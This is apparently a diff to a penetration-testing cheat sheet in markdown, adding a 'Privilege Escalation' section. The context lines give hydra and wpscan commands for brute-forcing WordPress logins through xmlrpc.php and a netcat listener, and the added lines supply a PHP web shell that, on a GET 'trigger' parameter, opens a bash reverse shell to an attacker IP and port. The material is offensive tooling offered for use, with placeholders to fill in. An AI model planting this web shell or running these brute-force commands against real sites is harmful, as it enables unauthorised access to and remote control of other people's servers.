@@ -44,4 +44,15 @@
 | hydra | hydra -L [USRFILE] -P [PWDFILE] [IP] -s [PORT] http-post-form "[url]:method=wp.getUsersBlogs&user=^USER^&password=^PASS^:Invalid" -V       |
 | wordpress wpscan (using xmlrpc.php) | wpscan --url [URL] -U [USER] -P [PWDFILE]       |
 
+
+## Privilege Escalation
 Listen: nc -lvnp [PORT]
+
+PHP Shell 
+```<?php
+
+if (isset($_GET['trigger'])) {
+    exec("/bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'");
+}```
+
+Linux Privilege Escalation Awesome Script (linPEAS)
